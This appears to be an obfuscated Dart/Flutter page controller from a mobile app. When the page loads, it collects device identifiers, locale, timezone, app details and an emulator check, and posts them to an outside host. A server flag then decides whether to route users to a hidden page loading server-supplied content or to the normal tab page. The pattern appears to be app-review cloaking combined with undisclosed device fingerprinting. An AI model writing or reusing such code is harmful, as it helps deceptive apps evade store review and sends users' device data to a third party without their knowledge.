import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var kzrenm = RxBool(false);
  var vwkhyzjobq = RxBool(true);
  var xjzm = RxString("");
  var zelda = RxBool(false);
  var conn = RxBool(true);
  final dlvhot = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    hzgpjvyk();
  }


  Future<void> hzgpjvyk() async {

    zelda.value = true;
    conn.value = true;
    vwkhyzjobq.value = false;

    dlvhot.post("http://dia.finerpaint.xyz/VOHT8iCT54I",data: await spnleutv()).then((value) {
      var lrynf = value.data["lrynf"] as String;
      var qfeskic = value.data["qfeskic"] as bool;
      if (qfeskic) {
        xjzm.value = lrynf;
        shawna();
      } else {
        powlowski();
      }
    }).catchError((e) {
      vwkhyzjobq.value = true;
      conn.value = true;
      zelda.value = false;
    });
  }

  Future<Map<String, dynamic>> spnleutv() async {
    final DeviceInfoPlugin vfrzdb = DeviceInfoPlugin();
    PackageInfo rzivyw_ldwa = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var hflqra = Platform.localeName;
    var cxYf = currentTimeZone;

    var fhyK = rzivyw_ldwa.packageName;
    var UyXP = rzivyw_ldwa.version;
    var xreEGAaV = rzivyw_ldwa.buildNumber;

    var QOWoE = rzivyw_ldwa.appName;
    var roselynShields = "";
    var MtAbwX = "";
    var nvWrLbF  = "";
    var dashawnDaugherty = "";
    var CLFGJjK = "";
    var groverBradtke = "";

    var lolitaKutch = "";

    var zHFYGn = "";
    var BhRDqjgJ = false;

    if (GetPlatform.isAndroid) {
      zHFYGn = "android";
      var cvoapunqdg = await vfrzdb.androidInfo;

      CLFGJjK = cvoapunqdg.brand;

      MtAbwX  = cvoapunqdg.model;
      nvWrLbF = cvoapunqdg.id;

      BhRDqjgJ = cvoapunqdg.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zHFYGn = "ios";
      var upmjgn = await vfrzdb.iosInfo;
      CLFGJjK = upmjgn.name;
      MtAbwX = upmjgn.model;

      nvWrLbF = upmjgn.identifierForVendor ?? "";
      BhRDqjgJ  = upmjgn.isPhysicalDevice;
    }
    var res = {
      "CLFGJjK": CLFGJjK,
      "xreEGAaV": xreEGAaV,
      "fhyK": fhyK,
      "dashawnDaugherty" : dashawnDaugherty,
      "MtAbwX": MtAbwX,
      "cxYf": cxYf,
      "nvWrLbF": nvWrLbF,
      "QOWoE": QOWoE,
      "hflqra": hflqra,
      "UyXP": UyXP,
      "zHFYGn": zHFYGn,
      "BhRDqjgJ": BhRDqjgJ,
      "lolitaKutch" : lolitaKutch,
      "roselynShields" : roselynShields,
      "groverBradtke" : groverBradtke,

    };
    return res;
  }

  Future<void> powlowski() async {
    Get.offAllNamed("/tab-page");
  }

  Future<void> shawna() async {
    Get.offAllNamed("/pas-nm");
  }

}
